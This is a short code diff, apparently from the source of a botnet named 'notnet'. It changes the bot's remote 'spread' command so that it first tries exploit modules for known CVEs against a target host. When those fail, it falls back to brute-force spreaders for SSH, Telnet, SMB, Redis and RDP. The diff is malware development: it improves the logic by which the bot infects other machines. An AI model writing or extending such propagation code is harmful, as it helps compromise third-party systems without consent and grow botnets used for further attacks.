@@ -1617,14 +1617,20 @@ int protocol_process_commands(notnet_bot_t *bot) {
             uint16_t port = 0;
             if (sscanf(args, "%255[^:]:%hu", host, &port) == 2) {
                 log_info("CMD: spread %s:%d", host, port);
-                int spread_ok = 0;
-                switch (port) {
-                    case 22:  spread_ok = spread_ssh(bot, host, port); break;
-                    case 23:  spread_ok = spread_telnet(bot, host, port); break;
-                    case 445: spread_ok = spread_smb(bot, host, port); break;
-                    case 6379: spread_ok = spread_redis(bot, host, port); break;
-                    case 3389: spread_ok = spread_rdp(bot, host, port); break;
-                    default: log_info("CMD: spread unknown port %d", port); break;
+                int spread_ok = -1;
+                /* #83: CVE-first — known-CVE modules are the primary
+                 * vector; brute-force spreaders run only as fallback. */
+                if (cve_run_modules(bot, host, port) == 0) {
+                    spread_ok = 0;
+                } else {
+                    switch (port) {
+                        case 22:  spread_ok = spread_ssh(bot, host, port); break;
+                        case 23:  spread_ok = spread_telnet(bot, host, port); break;
+                        case 445: spread_ok = spread_smb(bot, host, port); break;
+                        case 6379: spread_ok = spread_redis(bot, host, port); break;
+                        case 3389: spread_ok = spread_rdp(bot, host, port); break;
+                        default: log_info("CMD: spread unknown port %d", port); break;
+                    }
                 }
                 if (spread_ok == 0) {
                     bot->scan_count++;
